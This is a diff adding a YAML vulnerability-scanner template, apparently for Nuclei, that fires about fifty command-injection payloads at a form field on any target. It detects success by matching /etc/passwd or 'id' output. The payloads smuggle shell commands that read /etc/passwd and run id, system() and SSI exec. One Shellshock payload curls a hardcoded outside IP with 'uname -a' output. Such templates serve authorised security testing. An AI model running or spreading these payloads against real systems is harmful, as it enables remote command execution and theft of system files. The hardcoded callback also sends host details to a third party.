@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "cat /etc/passwd"
+        - "%26cat%2520%2Fetc%2Fpasswd"
+        - ";${@print(md5(\"whoami\"))}"
+        - "&cat%20/etc/passwd"
+        - "%5Cid"
+        - "%5Cid"
+        - "%22id"
+        - ";cat%20/etc/passwd"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%27%20id"
+        - "id%29"
+        - ";system('ls')"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=12?uname=\\`uname -a\\`\""
+        - "%60cat%2Fetc%24u%2Fpasswd%60"
+        - "cat+/etc/passwd+#"
+        - "&cat$IFS/etc/passwd"
+        - "|id"
+        - "%2F%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "${PATH##*s????}${IFS}ls -al"
+        - "a);id"
+        - "%27i%27d"
+        - "&cat%20/etc/passwd"
+        - "%26id"
+        - "%22%20id"
+        - "%26%20id"
+        - ";system('cat%20/etc/passwd')"
+        - "%22cat%20%2Fetc%24u%2Fpasswd%22"
+        - "cat$u /etc$u/passwd"
+        - "%7Ccat%24IFS%2Fetc%2Fpasswd"
+        - "%29%7Cid%0A"
+        - "<id"
+        - ";${IFS};id;"
+        - "%29%7Cid"
+        - "%27cat%2B%2Fetc%2Fpasswd%27"
+        - "%22%2Cid"
+        - "`id`"
+        - "%22%20id"
+        - "%29%20id"
+        - "%24%28cat%20/etc/passwd%29"
+        - "a;id"
+        - "cat%20/etc/passwd"
+        - "&&cat%20/etc/passwd"
+        - "& id"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%60cat%20%2Fetc%2Fpasswd%60"
+        - "%5Cid"
+        - "%60cat%20%2Fetc%2Fpasswd%60"
+        - "id"
+        - "a)|id|"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
